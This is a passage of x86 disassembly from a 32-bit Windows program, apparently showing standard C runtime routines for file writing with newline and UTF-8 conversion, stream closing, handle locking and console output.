  424792:	je     0x4246ab
  424798:	add    esi,DWORD PTR [ebp-0x1ae0]
  42479e:	cmp    DWORD PTR [ebp-0x1ae0],edi
  4247a4:	jl     0x4247bc
  4247a6:	mov    edx,DWORD PTR [ebp-0x1ac8]
  4247ac:	mov    eax,edx
  4247ae:	sub    eax,DWORD PTR [ebp-0x1ad0]
  4247b4:	cmp    eax,ebx
  4247b6:	jb     0x4246fd
  4247bc:	mov    edi,DWORD PTR [ebp-0x1acc]
  4247c2:	mov    ecx,DWORD PTR [ebp-0x1abc]
  4247c8:	test   esi,esi
  4247ca:	jne    0x424ac5
  4247d0:	test   edi,edi
  4247d2:	je     0x424a84
  4247d8:	push   0x5
  4247da:	pop    ebx
  4247db:	cmp    edi,ebx
  4247dd:	jne    0x424a7b
  4247e3:	call   0x41fb32
  4247e8:	mov    DWORD PTR [eax],0x9
  4247ee:	call   0x422632
  4247f3:	mov    DWORD PTR [eax],ebx
  4247f5:	jmp    0x424ac0
  4247fa:	mov    ecx,edx
  4247fc:	cmp    bl,0x2
  4247ff:	jne    0x4248ef
  424805:	cmp    DWORD PTR [ebp+0x10],esi
  424808:	jbe    0x424a8a
  42480e:	mov    DWORD PTR [ebp-0x1aec],0xa
  424818:	and    DWORD PTR [ebp-0x1ae8],0x0
  42481f:	lea    ebx,[ebp-0x140c]
  424825:	mov    eax,ecx
  424827:	push   0xd
  424829:	sub    eax,edx
  42482b:	mov    edx,DWORD PTR [ebp-0x1ae8]
  424831:	pop    esi
  424832:	cmp    eax,DWORD PTR [ebp+0x10]
  424835:	jae    0x42486a
  424837:	movzx  edi,WORD PTR [ecx]
  42483a:	add    eax,0x2
  42483d:	add    ecx,0x2
  424840:	cmp    di,WORD PTR [ebp-0x1aec]
  424847:	jne    0x424859
  424849:	add    DWORD PTR [ebp-0x1abc],0x2
  424850:	mov    WORD PTR [ebx],si
  424853:	add    ebx,0x2
  424856:	add    edx,0x2
  424859:	mov    WORD PTR [ebx],di
  42485c:	add    edx,0x2
  42485f:	add    ebx,0x2
  424862:	cmp    edx,0x13fe
  424868:	jb     0x424832
  42486a:	lea    eax,[ebp-0x140c]
  424870:	mov    DWORD PTR [ebp-0x1ac4],ecx
  424876:	mov    ecx,DWORD PTR [ebp-0x1adc]
  42487c:	sub    ebx,eax
  42487e:	push   0x0
  424880:	lea    eax,[ebp-0x1ae0]
  424886:	push   eax
  424887:	push   ebx
  424888:	lea    eax,[ebp-0x140c]
  42488e:	push   eax
  42488f:	mov    eax,DWORD PTR [ebp-0x1ad8]
  424895:	mov    eax,DWORD PTR [eax*4+0x431df8]
  42489c:	push   DWORD PTR [ecx+eax*1]
  42489f:	call   DWORD PTR ds:0x429078
  4248a5:	mov    esi,DWORD PTR [ebp-0x1ac0]
  4248ab:	mov    edi,DWORD PTR [ebp-0x1acc]
  4248b1:	test   eax,eax
  4248b3:	je     0x4246ab
  4248b9:	add    esi,DWORD PTR [ebp-0x1ae0]
  4248bf:	mov    DWORD PTR [ebp-0x1ac0],esi
  4248c5:	cmp    DWORD PTR [ebp-0x1ae0],ebx
  4248cb:	jl     0x4247c2
  4248d1:	mov    ecx,DWORD PTR [ebp-0x1ac4]
  4248d7:	mov    eax,ecx
  4248d9:	mov    edx,DWORD PTR [ebp-0x1ad0]
  4248df:	sub    eax,edx
  4248e1:	cmp    eax,DWORD PTR [ebp+0x10]
  4248e4:	jb     0x424818
  4248ea:	jmp    0x4247c2
  4248ef:	mov    ebx,DWORD PTR [ebp+0x10]
  4248f2:	mov    DWORD PTR [ebp-0x1ac8],ecx
  4248f8:	test   ebx,ebx
  4248fa:	je     0x424a8a
  424900:	mov    DWORD PTR [ebp-0x1aec],0xa
  42490a:	and    DWORD PTR [ebp-0x1ae8],0x0
  424911:	lea    eax,[ebp-0x1ab8]
  424917:	mov    edi,DWORD PTR [ebp-0x1ac8]
  42491d:	sub    ecx,edx
  42491f:	mov    edx,DWORD PTR [ebp-0x1ae8]
  424925:	cmp    ecx,ebx
  424927:	jae    0x424964
  424929:	movzx  esi,WORD PTR [edi]
  42492c:	add    ecx,0x2
  42492f:	add    edi,0x2
  424932:	mov    DWORD PTR [ebp-0x1ac8],edi
  424938:	cmp    si,WORD PTR [ebp-0x1aec]
  42493f:	jne    0x424953
  424941:	push   0xd
  424943:	pop    edi
  424944:	mov    WORD PTR [eax],di
  424947:	add    eax,0x2
  42494a:	mov    edi,DWORD PTR [ebp-0x1ac8]
  424950:	add    edx,0x2
  424953:	mov    WORD PTR [eax],si
  424956:	add    edx,0x2
  424959:	add    eax,0x2
  42495c:	cmp    edx,0x6a8
  424962:	jb     0x424925
  424964:	xor    esi,esi
  424966:	lea    ecx,[ebp-0xd64]
  42496c:	push   esi
  42496d:	push   esi
  42496e:	push   0xd55
  424973:	push   ecx
  424974:	lea    ecx,[ebp-0x1ab8]
  42497a:	sub    eax,ecx
  42497c:	cdq    
  42497d:	sub    eax,edx
  42497f:	sar    eax,1
  424981:	push   eax
  424982:	mov    eax,ecx
  424984:	push   eax
  424985:	push   esi
  424986:	push   0xfde9
  42498b:	call   DWORD PTR ds:0x42905c
  424991:	mov    esi,DWORD PTR [ebp-0x1ac0]
  424997:	mov    edi,DWORD PTR [ebp-0x1acc]
  42499d:	mov    DWORD PTR [ebp-0x1ac4],eax
  4249a3:	test   eax,eax
  4249a5:	je     0x4246ab
  4249ab:	xor    ecx,ecx
  4249ad:	mov    DWORD PTR [ebp-0x1ac0],ecx
  4249b3:	push   0x0
  4249b5:	sub    eax,ecx
  4249b7:	lea    edx,[ebp-0x1ae0]
  4249bd:	push   edx
  4249be:	push   eax
  4249bf:	lea    eax,[ebp-0xd64]
  4249c5:	add    eax,ecx
  4249c7:	mov    ecx,DWORD PTR [ebp-0x1adc]
  4249cd:	push   eax
  4249ce:	mov    eax,DWORD PTR [ebp-0x1ad8]
  4249d4:	mov    eax,DWORD PTR [eax*4+0x431df8]
  4249db:	push   DWORD PTR [ecx+eax*1]
  4249de:	call   DWORD PTR ds:0x429078
  4249e4:	test   eax,eax
  4249e6:	je     0x424a06
  4249e8:	mov    ecx,DWORD PTR [ebp-0x1ac0]
  4249ee:	add    ecx,DWORD PTR [ebp-0x1ae0]
  4249f4:	mov    eax,DWORD PTR [ebp-0x1ac4]
  4249fa:	mov    DWORD PTR [ebp-0x1ac0],ecx
  424a00:	cmp    eax,ecx
  424a02:	jg     0x4249b3
  424a04:	jmp    0x424a20
  424a06:	call   DWORD PTR ds:0x429030
  424a0c:	mov    ecx,DWORD PTR [ebp-0x1ac0]
  424a12:	mov    edi,eax
  424a14:	mov    eax,DWORD PTR [ebp-0x1ac4]
  424a1a:	mov    DWORD PTR [ebp-0x1acc],edi
  424a20:	cmp    eax,ecx
  424a22:	jg     0x4247c2
  424a28:	mov    ecx,DWORD PTR [ebp-0x1ac8]
  424a2e:	mov    esi,ecx
  424a30:	mov    edx,DWORD PTR [ebp-0x1ad0]
  424a36:	sub    esi,edx
  424a38:	mov    DWORD PTR [ebp-0x1ac0],esi
  424a3e:	cmp    esi,ebx
  424a40:	jb     0x42490a
  424a46:	jmp    0x4247c2
  424a4b:	push   0x0
  424a4d:	lea    edx,[ebp-0x1ae0]
  424a53:	push   edx
  424a54:	push   DWORD PTR [ebp+0x10]
  424a57:	push   DWORD PTR [ebp-0x1ad0]
  424a5d:	push   DWORD PTR [eax+ecx*1]
  424a60:	call   DWORD PTR ds:0x429078
  424a66:	test   eax,eax
  424a68:	je     0x4246ab
  424a6e:	mov    esi,DWORD PTR [ebp-0x1ae0]
  424a74:	xor    edi,edi
  424a76:	jmp    0x4247c2
  424a7b:	push   edi
  424a7c:	call   0x422645
  424a81:	pop    ecx
  424a82:	jmp    0x424ac0
  424a84:	mov    edx,DWORD PTR [ebp-0x1ad0]
  424a8a:	mov    eax,DWORD PTR [ebp-0x1ad8]
  424a90:	mov    ecx,DWORD PTR [ebp-0x1adc]
  424a96:	mov    eax,DWORD PTR [eax*4+0x431df8]
  424a9d:	test   BYTE PTR [ecx+eax*1+0x4],0x40
  424aa2:	je     0x424aad
  424aa4:	cmp    BYTE PTR [edx],0x1a
  424aa7:	jne    0x424aad
  424aa9:	xor    eax,eax
  424aab:	jmp    0x424ac9
  424aad:	call   0x41fb32
  424ab2:	mov    DWORD PTR [eax],0x1c
  424ab8:	call   0x422632
  424abd:	and    DWORD PTR [eax],0x0
  424ac0:	or     eax,0xffffffff
  424ac3:	jmp    0x424ac9
  424ac5:	sub    esi,ecx
  424ac7:	mov    eax,esi
  424ac9:	pop    ebx
  424aca:	mov    ecx,DWORD PTR [ebp-0x4]
  424acd:	pop    edi
  424ace:	xor    ecx,ebp
  424ad0:	pop    esi
  424ad1:	call   0x421878
  424ad6:	mov    esp,ebp
  424ad8:	pop    ebp
  424ad9:	ret    
  424ada:	push   ebp
  424adb:	mov    ebp,esp
  424add:	push   esi
  424ade:	mov    esi,DWORD PTR [ebp+0x8]
  424ae1:	push   edi
  424ae2:	or     edi,0xffffffff
  424ae5:	test   esi,esi
  424ae7:	jne    0x424afd
  424ae9:	call   0x41fb32
  424aee:	mov    DWORD PTR [eax],0x16
  424af4:	call   0x422622
  424af9:	or     eax,edi
  424afb:	jmp    0x424b42
  424afd:	test   BYTE PTR [esi+0xc],0x83
  424b01:	je     0x424b3c
  424b03:	push   esi
  424b04:	call   0x423a62
  424b09:	push   esi
  424b0a:	mov    edi,eax
  424b0c:	call   0x4250d5
  424b11:	push   esi
  424b12:	call   0x4239a4
  424b17:	push   eax
  424b18:	call   0x424f60
  424b1d:	add    esp,0x10
  424b20:	test   eax,eax
  424b22:	jns    0x424b29
  424b24:	or     edi,0xffffffff
  424b27:	jmp    0x424b3c
  424b29:	cmp    DWORD PTR [esi+0x1c],0x0
  424b2d:	je     0x424b3c
  424b2f:	push   DWORD PTR [esi+0x1c]
  424b32:	call   0x41f0cb
  424b37:	and    DWORD PTR [esi+0x1c],0x0
  424b3b:	pop    ecx
  424b3c:	and    DWORD PTR [esi+0xc],0x0
  424b40:	mov    eax,edi
  424b42:	pop    edi
  424b43:	pop    esi
  424b44:	pop    ebp
  424b45:	ret    
  424b46:	push   0xc
  424b48:	push   0x42dc00
  424b4d:	call   0x4221c0
  424b52:	or     edi,0xffffffff
  424b55:	mov    DWORD PTR [ebp-0x1c],edi
  424b58:	xor    eax,eax
  424b5a:	mov    esi,DWORD PTR [ebp+0x8]
  424b5d:	test   esi,esi
  424b5f:	setne  al
  424b62:	test   eax,eax
  424b64:	jne    0x424b7e
  424b66:	call   0x41fb32
  424b6b:	mov    DWORD PTR [eax],0x16
  424b71:	call   0x422622
  424b76:	mov    eax,edi
  424b78:	call   0x422205
  424b7d:	ret    
  424b7e:	test   BYTE PTR [esi+0xc],0x40
  424b82:	je     0x424b8a
  424b84:	and    DWORD PTR [esi+0xc],0x0
  424b88:	jmp    0x424b76
  424b8a:	push   esi
  424b8b:	call   0x42294c
  424b90:	pop    ecx
  424b91:	and    DWORD PTR [ebp-0x4],0x0
  424b95:	push   esi
  424b96:	call   0x424ada
  424b9b:	pop    ecx
  424b9c:	mov    edi,eax
  424b9e:	mov    DWORD PTR [ebp-0x1c],edi
  424ba1:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  424ba8:	call   0x424bb5
  424bad:	jmp    0x424b76
  424baf:	mov    esi,DWORD PTR [ebp+0x8]
  424bb2:	mov    edi,DWORD PTR [ebp-0x1c]
  424bb5:	push   esi
  424bb6:	call   0x4229bb
  424bbb:	pop    ecx
  424bbc:	ret    
  424bbd:	int3   
  424bbe:	int3   
  424bbf:	int3   
  424bc0:	push   ecx
  424bc1:	lea    ecx,[esp+0x4]
  424bc5:	sub    ecx,eax
  424bc7:	sbb    eax,eax
  424bc9:	not    eax
  424bcb:	and    ecx,eax
  424bcd:	mov    eax,esp
  424bcf:	and    eax,0xfffff000
  424bd4:	cmp    ecx,eax
  424bd6:	jb     0x424be2
  424bd8:	mov    eax,ecx
  424bda:	pop    ecx
  424bdb:	xchg   esp,eax
  424bdc:	mov    eax,DWORD PTR [eax]
  424bde:	mov    DWORD PTR [esp],eax
  424be1:	ret    
  424be2:	sub    eax,0x1000
  424be7:	test   DWORD PTR [eax],eax
  424be9:	jmp    0x424bd4
  424beb:	push   0x8
  424bed:	push   0x42dc20
  424bf2:	call   0x4221c0
  424bf7:	mov    edi,DWORD PTR [ebp+0x8]
  424bfa:	mov    eax,edi
  424bfc:	sar    eax,0x5
  424bff:	mov    esi,edi
  424c01:	and    esi,0x1f
  424c04:	shl    esi,0x6
  424c07:	add    esi,DWORD PTR [eax*4+0x431df8]
  424c0e:	xor    ebx,ebx
  424c10:	cmp    DWORD PTR [esi+0x8],ebx
  424c13:	jne    0x424c46
  424c15:	push   0xa
  424c17:	call   0x41fabe
  424c1c:	pop    ecx
  424c1d:	mov    DWORD PTR [ebp-0x4],ebx
  424c20:	cmp    DWORD PTR [esi+0x8],ebx
  424c23:	jne    0x424c3a
  424c25:	push   ebx
  424c26:	push   0xfa0
  424c2b:	lea    eax,[esi+0xc]
  424c2e:	push   eax
  424c2f:	call   0x421e72
  424c34:	add    esp,0xc
  424c37:	inc    DWORD PTR [esi+0x8]
  424c3a:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  424c41:	call   0x424c70
  424c46:	mov    eax,edi
  424c48:	sar    eax,0x5
  424c4b:	and    edi,0x1f
  424c4e:	shl    edi,0x6
  424c51:	mov    eax,DWORD PTR [eax*4+0x431df8]
  424c58:	add    eax,0xc
  424c5b:	add    eax,edi
  424c5d:	push   eax
  424c5e:	call   DWORD PTR ds:0x4290c0
  424c64:	xor    eax,eax
  424c66:	inc    eax
  424c67:	call   0x422205
  424c6c:	ret    
  424c6d:	mov    edi,DWORD PTR [ebp+0x8]
  424c70:	push   0xa
  424c72:	call   0x421933
  424c77:	pop    ecx
  424c78:	ret    
  424c79:	push   ebp
  424c7a:	mov    ebp,esp
  424c7c:	mov    eax,DWORD PTR [ebp+0x8]
  424c7f:	push   esi
  424c80:	push   edi
  424c81:	test   eax,eax
  424c83:	js     0x424ce5
  424c85:	cmp    eax,DWORD PTR ds:0x433be4
  424c8b:	jae    0x424ce5
  424c8d:	mov    edi,eax
  424c8f:	mov    esi,eax
  424c91:	sar    edi,0x5
  424c94:	and    esi,0x1f
  424c97:	shl    esi,0x6
  424c9a:	mov    ecx,DWORD PTR [edi*4+0x431df8]
  424ca1:	test   BYTE PTR [esi+ecx*1+0x4],0x1
  424ca6:	je     0x424ce5
  424ca8:	cmp    DWORD PTR [esi+ecx*1],0xffffffff
  424cac:	je     0x424ce5
  424cae:	cmp    DWORD PTR ds:0x432000,0x1
  424cb5:	jne    0x424cd6
  424cb7:	xor    ecx,ecx
  424cb9:	sub    eax,ecx
  424cbb:	je     0x424ccd
  424cbd:	dec    eax
  424cbe:	je     0x424cc8
  424cc0:	dec    eax
  424cc1:	jne    0x424cd6
  424cc3:	push   ecx
  424cc4:	push   0xfffffff4
  424cc6:	jmp    0x424cd0
  424cc8:	push   ecx
  424cc9:	push   0xfffffff5
  424ccb:	jmp    0x424cd0
  424ccd:	push   ecx
  424cce:	push   0xfffffff6
  424cd0:	call   DWORD PTR ds:0x429010
  424cd6:	mov    eax,DWORD PTR [edi*4+0x431df8]
  424cdd:	or     DWORD PTR [esi+eax*1],0xffffffff
  424ce1:	xor    eax,eax
  424ce3:	jmp    0x424cfb
  424ce5:	call   0x41fb32
  424cea:	mov    DWORD PTR [eax],0x9
  424cf0:	call   0x422632
  424cf5:	and    DWORD PTR [eax],0x0
  424cf8:	or     eax,0xffffffff
  424cfb:	pop    edi
  424cfc:	pop    esi
  424cfd:	pop    ebp
  424cfe:	ret    
  424cff:	push   ebp
  424d00:	mov    ebp,esp
  424d02:	mov    ecx,DWORD PTR [ebp+0x8]
  424d05:	cmp    ecx,0xfffffffe
  424d08:	jne    0x424d1f
  424d0a:	call   0x422632
  424d0f:	and    DWORD PTR [eax],0x0
  424d12:	call   0x41fb32
  424d17:	mov    DWORD PTR [eax],0x9
  424d1d:	jmp    0x424d61
  424d1f:	test   ecx,ecx
  424d21:	js     0x424d49
  424d23:	cmp    ecx,DWORD PTR ds:0x433be4
  424d29:	jae    0x424d49
  424d2b:	mov    eax,ecx
  424d2d:	and    ecx,0x1f
  424d30:	sar    eax,0x5
  424d33:	shl    ecx,0x6
  424d36:	mov    eax,DWORD PTR [eax*4+0x431df8]
  424d3d:	test   BYTE PTR [eax+ecx*1+0x4],0x1
  424d42:	je     0x424d49
  424d44:	mov    eax,DWORD PTR [eax+ecx*1]
  424d47:	pop    ebp
  424d48:	ret    
  424d49:	call   0x422632
  424d4e:	and    DWORD PTR [eax],0x0
  424d51:	call   0x41fb32
  424d56:	mov    DWORD PTR [eax],0x9
  424d5c:	call   0x422622
  424d61:	or     eax,0xffffffff
  424d64:	pop    ebp
  424d65:	ret    
  424d66:	push   ebp
  424d67:	mov    ebp,esp
  424d69:	mov    ecx,DWORD PTR [ebp+0x8]
  424d6c:	mov    eax,ecx
  424d6e:	sar    eax,0x5
  424d71:	and    ecx,0x1f
  424d74:	shl    ecx,0x6
  424d77:	add    ecx,0xc
  424d7a:	mov    eax,DWORD PTR [eax*4+0x431df8]
  424d81:	add    eax,ecx
  424d83:	push   eax
  424d84:	call   DWORD PTR ds:0x4290c4
  424d8a:	pop    ebp
  424d8b:	ret    
  424d8c:	push   ebp
  424d8d:	mov    ebp,esp
  424d8f:	push   0x0
  424d91:	push   DWORD PTR [ebp+0x8]
  424d94:	call   0x4218f9
  424d99:	pop    ecx
  424d9a:	pop    ecx
  424d9b:	pop    ebp
  424d9c:	ret    
  424d9d:	push   ebp
  424d9e:	mov    ebp,esp
  424da0:	push   ecx
  424da1:	push   ecx
  424da2:	push   esi
  424da3:	mov    esi,DWORD PTR [ebp+0x8]
  424da6:	push   edi
  424da7:	push   esi
  424da8:	call   0x424cff
  424dad:	or     edi,0xffffffff
  424db0:	pop    ecx
  424db1:	cmp    eax,edi
  424db3:	jne    0x424dc6
  424db5:	call   0x41fb32
  424dba:	mov    DWORD PTR [eax],0x9
  424dc0:	mov    eax,edi
  424dc2:	mov    edx,edi
  424dc4:	jmp    0x424e0a
  424dc6:	push   DWORD PTR [ebp+0x14]
  424dc9:	lea    ecx,[ebp-0x8]
  424dcc:	push   ecx
  424dcd:	push   DWORD PTR [ebp+0x10]
  424dd0:	push   DWORD PTR [ebp+0xc]
  424dd3:	push   eax
  424dd4:	call   DWORD PTR ds:0x42900c
  424dda:	test   eax,eax
  424ddc:	jne    0x424ded
  424dde:	call   DWORD PTR ds:0x429030
  424de4:	push   eax
  424de5:	call   0x422645
  424dea:	pop    ecx
  424deb:	jmp    0x424dc0
  424ded:	mov    eax,esi
  424def:	and    esi,0x1f
  424df2:	sar    eax,0x5
  424df5:	shl    esi,0x6
  424df8:	mov    eax,DWORD PTR [eax*4+0x431df8]
  424dff:	and    BYTE PTR [eax+esi*1+0x4],0xfd
  424e04:	mov    eax,DWORD PTR [ebp-0x8]
  424e07:	mov    edx,DWORD PTR [ebp-0x4]
  424e0a:	pop    edi
  424e0b:	pop    esi
  424e0c:	mov    esp,ebp
  424e0e:	pop    ebp
  424e0f:	ret    
  424e10:	push   ebp
  424e11:	mov    ebp,esp
  424e13:	sub    esp,0x10
  424e16:	push   ebx
  424e17:	push   esi
  424e18:	mov    esi,DWORD PTR [ebp+0xc]
  424e1b:	test   esi,esi
  424e1d:	je     0x424e37
  424e1f:	mov    ebx,DWORD PTR [ebp+0x10]
  424e22:	test   ebx,ebx
  424e24:	je     0x424e37
  424e26:	cmp    BYTE PTR [esi],0x0
  424e29:	jne    0x424e3f
  424e2b:	mov    eax,DWORD PTR [ebp+0x8]
  424e2e:	test   eax,eax
  424e30:	je     0x424e37
  424e32:	xor    ecx,ecx
  424e34:	mov    WORD PTR [eax],cx
  424e37:	xor    eax,eax
  424e39:	pop    esi
  424e3a:	pop    ebx
  424e3b:	mov    esp,ebp
  424e3d:	pop    ebp
  424e3e:	ret    
  424e3f:	push   edi
  424e40:	push   DWORD PTR [ebp+0x14]
  424e43:	lea    ecx,[ebp-0x10]
  424e46:	call   0x4207b2
  424e4b:	mov    eax,DWORD PTR [ebp-0x10]
  424e4e:	cmp    DWORD PTR [eax+0xa8],0x0
  424e55:	jne    0x424e6c
  424e57:	mov    ecx,DWORD PTR [ebp+0x8]
  424e5a:	test   ecx,ecx
  424e5c:	je     0x424e64
  424e5e:	movzx  eax,BYTE PTR [esi]
  424e61:	mov    WORD PTR [ecx],ax
  424e64:	xor    edi,edi
  424e66:	inc    edi
  424e67:	jmp    0x424ef0
  424e6c:	lea    eax,[ebp-0x10]
  424e6f:	push   eax
  424e70:	movzx  eax,BYTE PTR [esi]
  424e73:	push   eax
  424e74:	call   0x4218f9
  424e79:	pop    ecx
  424e7a:	pop    ecx
  424e7b:	test   eax,eax
  424e7d:	je     0x424ebf
  424e7f:	mov    edi,DWORD PTR [ebp-0x10]
  424e82:	cmp    DWORD PTR [edi+0x74],0x1
  424e86:	jle    0x424eaf
  424e88:	cmp    ebx,DWORD PTR [edi+0x74]
  424e8b:	jl     0x424eb2
  424e8d:	xor    eax,eax
  424e8f:	cmp    DWORD PTR [ebp+0x8],eax
  424e92:	setne  al
  424e95:	push   eax
  424e96:	push   DWORD PTR [ebp+0x8]
  424e99:	push   DWORD PTR [edi+0x74]
  424e9c:	push   esi
  424e9d:	push   0x9
  424e9f:	push   DWORD PTR [edi+0x4]
  424ea2:	call   DWORD PTR ds:0x429058
  424ea8:	mov    edi,DWORD PTR [ebp-0x10]
  424eab:	test   eax,eax
  424ead:	jne    0x424eba
  424eaf:	cmp    ebx,DWORD PTR [edi+0x74]
  424eb2:	jb     0x424ee2
  424eb4:	cmp    BYTE PTR [esi+0x1],0x0
  424eb8:	je     0x424ee2
  424eba:	mov    edi,DWORD PTR [edi+0x74]
  424ebd:	jmp    0x424ef0
  424ebf:	xor    eax,eax
  424ec1:	cmp    DWORD PTR [ebp+0x8],eax
  424ec4:	setne  al
  424ec7:	xor    edi,edi
  424ec9:	push   eax
  424eca:	push   DWORD PTR [ebp+0x8]
  424ecd:	mov    eax,DWORD PTR [ebp-0x10]
  424ed0:	inc    edi
  424ed1:	push   edi
  424ed2:	push   esi
  424ed3:	push   0x9
  424ed5:	push   DWORD PTR [eax+0x4]
  424ed8:	call   DWORD PTR ds:0x429058
  424ede:	test   eax,eax
  424ee0:	jne    0x424ef0
  424ee2:	call   0x41fb32
  424ee7:	or     edi,0xffffffff
  424eea:	mov    DWORD PTR [eax],0x2a
  424ef0:	cmp    BYTE PTR [ebp-0x4],0x0
  424ef4:	je     0x424efd
  424ef6:	mov    ecx,DWORD PTR [ebp-0x8]
  424ef9:	and    DWORD PTR [ecx+0x70],0xfffffffd
  424efd:	mov    eax,edi
  424eff:	pop    edi
  424f00:	jmp    0x424e39
  424f05:	push   ebp
  424f06:	mov    ebp,esp
  424f08:	push   0x0
  424f0a:	push   DWORD PTR [ebp+0x10]
  424f0d:	push   DWORD PTR [ebp+0xc]
  424f10:	push   DWORD PTR [ebp+0x8]
  424f13:	call   0x424e10
  424f18:	add    esp,0x10
  424f1b:	pop    ebp
  424f1c:	ret    
  424f1d:	push   ebp
  424f1e:	mov    ebp,esp
  424f20:	push   ecx
  424f21:	mov    eax,ds:0x431590
  424f26:	cmp    eax,0xfffffffe
  424f29:	jne    0x424f35
  424f2b:	call   0x42511c
  424f30:	mov    eax,ds:0x431590
  424f35:	cmp    eax,0xffffffff
  424f38:	jne    0x424f41
  424f3a:	mov    eax,0xffff
  424f3f:	jmp    0x424f5c
  424f41:	push   0x0
  424f43:	lea    ecx,[ebp-0x4]
  424f46:	push   ecx
  424f47:	push   0x1
  424f49:	lea    ecx,[ebp+0x8]
  424f4c:	push   ecx
  424f4d:	push   eax
  424f4e:	call   DWORD PTR ds:0x429008
  424f54:	test   eax,eax
  424f56:	je     0x424f3a
  424f58:	mov    ax,WORD PTR [ebp+0x8]
  424f5c:	mov    esp,ebp
  424f5e:	pop    ebp
  424f5f:	ret    
  424f60:	push   0x10
  424f62:	push   0x42dc40
  424f67:	call   0x4221c0
  424f6c:	xor    ebx,ebx
  424f6e:	mov    DWORD PTR [ebp-0x1c],ebx
  424f71:	mov    esi,DWORD PTR [ebp+0x8]
  424f74:	cmp    esi,0xfffffffe
  424f77:	jne    0x424f90
  424f79:	call   0x422632
  424f7e:	mov    DWORD PTR [eax],ebx
  424f80:	call   0x41fb32
  424f85:	mov    DWORD PTR [eax],0x9
  424f8b:	jmp    0x425032
  424f90:	test   esi,esi
  424f92:	js     0x42501b
  424f98:	cmp    esi,DWORD PTR ds:0x433be4
  424f9e:	jae    0x42501b
  424fa0:	mov    ebx,esi
  424fa2:	sar    ebx,0x5
  424fa5:	mov    edi,esi
  424fa7:	and    edi,0x1f
  424faa:	shl    edi,0x6
  424fad:	mov    eax,DWORD PTR [ebx*4+0x431df8]
  424fb4:	movsx  eax,BYTE PTR [eax+edi*1+0x4]
  424fb9:	and    eax,0x1
  424fbc:	jne    0x424fc8
  424fbe:	call   0x422632
  424fc3:	and    DWORD PTR [eax],0x0
  424fc6:	jmp    0x425022
  424fc8:	push   esi
  424fc9:	call   0x424beb
  424fce:	pop    ecx
  424fcf:	and    DWORD PTR [ebp-0x4],0x0
  424fd3:	mov    eax,DWORD PTR [ebx*4+0x431df8]
  424fda:	test   BYTE PTR [eax+edi*1+0x4],0x1
  424fdf:	je     0x424fec
  424fe1:	push   esi
  424fe2:	call   0x42503b
  424fe7:	pop    ecx
  424fe8:	mov    edi,eax
  424fea:	jmp    0x424ffa
  424fec:	call   0x41fb32
  424ff1:	mov    DWORD PTR [eax],0x9
  424ff7:	or     edi,0xffffffff
  424ffa:	mov    DWORD PTR [ebp-0x1c],edi
  424ffd:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  425004:	call   0x425013
  425009:	mov    eax,edi
  42500b:	jmp    0x425035
  42500d:	mov    esi,DWORD PTR [ebp+0x8]
  425010:	mov    edi,DWORD PTR [ebp-0x1c]
  425013:	push   esi
  425014:	call   0x424d66
  425019:	pop    ecx
  42501a:	ret    
  42501b:	call   0x422632
  425020:	mov    DWORD PTR [eax],ebx
  425022:	call   0x41fb32
  425027:	mov    DWORD PTR [eax],0x9
  42502d:	call   0x422622
  425032:	or     eax,0xffffffff
  425035:	call   0x422205
  42503a:	ret    
  42503b:	push   ebp
  42503c:	mov    ebp,esp
  42503e:	push   esi
  42503f:	push   edi
  425040:	mov    edi,DWORD PTR [ebp+0x8]
  425043:	push   edi
  425044:	call   0x424cff
  425049:	pop    ecx
  42504a:	cmp    eax,0xffffffff
  42504d:	je     0x42509f
  42504f:	mov    eax,ds:0x431df8
  425054:	cmp    edi,0x1
  425057:	jne    0x425062
  425059:	test   BYTE PTR [eax+0x84],0x1
  425060:	jne    0x42506d
  425062:	cmp    edi,0x2
  425065:	jne    0x425083
  425067:	test   BYTE PTR [eax+0x44],0x1
  42506b:	je     0x425083
  42506d:	push   0x2
  42506f:	call   0x424cff
  425074:	push   0x1
  425076:	mov    esi,eax
  425078:	call   0x424cff
  42507d:	pop    ecx
  42507e:	pop    ecx
  42507f:	cmp    eax,esi
  425081:	je     0x42509f
  425083:	push   edi
  425084:	call   0x424cff
  425089:	pop    ecx
  42508a:	push   eax
  42508b:	call   DWORD PTR ds:0x429020
  425091:	test   eax,eax
  425093:	jne    0x42509f
  425095:	call   DWORD PTR ds:0x429030
  42509b:	mov    esi,eax
  42509d:	jmp    0x4250a1
  42509f:	xor    esi,esi
  4250a1:	push   edi
  4250a2:	call   0x424c79
  4250a7:	pop    ecx
  4250a8:	mov    ecx,edi
  4250aa:	and    edi,0x1f
  4250ad:	sar    ecx,0x5
  4250b0:	shl    edi,0x6
  4250b3:	mov    ecx,DWORD PTR [ecx*4+0x431df8]
  4250ba:	mov    BYTE PTR [ecx+edi*1+0x4],0x0
  4250bf:	test   esi,esi
  4250c1:	je     0x4250cf
  4250c3:	push   esi
  4250c4:	call   0x422645
  4250c9:	pop    ecx
  4250ca:	or     eax,0xffffffff
  4250cd:	jmp    0x4250d1
  4250cf:	xor    eax,eax
  4250d1:	pop    edi
  4250d2:	pop    esi
  4250d3:	pop    ebp
  4250d4:	ret    
  4250d5:	push   ebp
  4250d6:	mov    ebp,esp
  4250d8:	push   esi
  4250d9:	mov    esi,DWORD PTR [ebp+0x8]
  4250dc:	test   BYTE PTR [esi+0xc],0x83
  4250e0:	je     0x425102
  4250e2:	test   BYTE PTR [esi+0xc],0x8
  4250e6:	je     0x425102
  4250e8:	push   DWORD PTR [esi+0x8]
  4250eb:	call   0x41f0cb
  4250f0:	and    DWORD PTR [esi+0xc],0xfffffbf7
  4250f7:	xor    eax,eax
  4250f9:	pop    ecx
  4250fa:	mov    DWORD PTR [esi],eax
  4250fc:	mov    DWORD PTR [esi+0x8],eax
  4250ff:	mov    DWORD PTR [esi+0x4],eax
  425102:	pop    esi
  425103:	pop    ebp
  425104:	ret    
  425105:	mov    eax,ds:0x431590
  42510a:	cmp    eax,0xffffffff
  42510d:	je     0x42511b
  42510f:	cmp    eax,0xfffffffe
  425112:	je     0x42511b
  425114:	push   eax
  425115:	call   DWORD PTR ds:0x429020
  42511b:	ret    
  42511c:	xor    eax,eax
  42511e:	push   eax
  42511f:	push   eax
  425120:	push   0x3
  425122:	push   eax
  425123:	push   0x3
  425125:	push   0x40000000
  42512a:	push   0x42d958
  42512f:	call   DWORD PTR ds:0x42909c
  425135:	mov    ds:0x431590,eax
  42513a:	ret    
  42513b:	int3   
  42513c:	int3   
  42513d:	int3   
  42513e:	int3   
  42513f:	int3   
  425140:	push   esi
